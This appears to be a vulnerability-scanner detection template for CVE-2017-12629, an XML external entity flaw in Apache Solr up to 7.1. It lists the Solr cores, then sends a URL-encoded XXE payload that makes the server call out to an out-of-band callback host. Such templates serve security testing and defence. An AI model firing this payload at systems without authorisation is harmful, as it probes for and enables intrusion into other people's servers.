id: CVE-2017-12629
info:
  name: Apache Solr <= 7.1 - XML Entity Injection
  author: dwisiswant0
  severity: critical
  description: Apache Solr before version 7.1 is vulnerable to remote code execution
    through exploitation of XXE on the XML Query Parser due to a Config API add-listener
    command that can be used to reach the RunExecutableListener class, but Elasticsearch
    is not affected.
  reference:
  - https://twitter.com/honoki/status/1298636315613974532
  - https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE
  - https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE
  - https://nvd.nist.gov/vuln/detail/CVE-2017-12629
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-12629
    cwe-id: CWE-611
  tags: oast,xxe,vulhub,cve,cve2017,solr,apache
  metadata:
    impact: CVE-2017-12629, a vulnerability in Apache Solr that could allow for remote
      code execution, highlights the importance of timely software updates and vigilant
      security measures to mitigate the potentially severe impact of such vulnerabilities.
    recommendation: It is highly recommended to upgrade to Apache Solr 7.2 or later,
      or switch to Elasticsearch, in order to mitigate the risk of remote code execution
      and XML external entity expansion vulnerabilities.
requests:
- raw:
  - 'GET /solr/admin/cores?wt=json HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F{{interactsh-url}}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  extractors:
  - type: regex
    internal: true
    name: core
    group: 1
    regex:
    - '"name"\:"(.*?)"'
